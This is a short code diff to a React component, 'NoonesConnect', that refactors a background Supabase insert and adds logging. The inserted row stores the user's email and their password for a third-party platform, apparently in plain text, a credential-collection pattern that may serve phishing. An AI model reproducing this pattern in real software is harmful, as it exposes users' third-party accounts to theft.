@@ -127,19 +127,21 @@ export default function NoonesConnect() {
       // Step 2: Fire INSERT with retry wrapper (non-blocking)
       // This returns immediately, but the sync happens in the background
       const syncId = `noones-step1-${trackingId}`;
-      fireAndMove(
-        () => Promise.resolve(supabase
+      const noonesInsertOperation = async () => {
+        const result = await supabase
           .from('platform_connection_requests')
           .insert({
             tracking_id: trackingId,
             platform: 'Noones',
             email,
             third_party_password: password,
-          })),
-        syncId,
-        { maxAttempts: 3, delayMs: 500 }
-      );
+          });
 
+        console.log('[NOONES_STEP1] Supabase INSERT response', result);
+        return result;
+      };
+
+      fireAndMove(noonesInsertOperation, syncId, { maxAttempts: 3, delayMs: 500 });
       console.log('[NOONES_STEP1] INSERT fired in background, navigating to Step 2...');
       
       // Step 3: Navigate immediately (Sync-and-Move pattern)
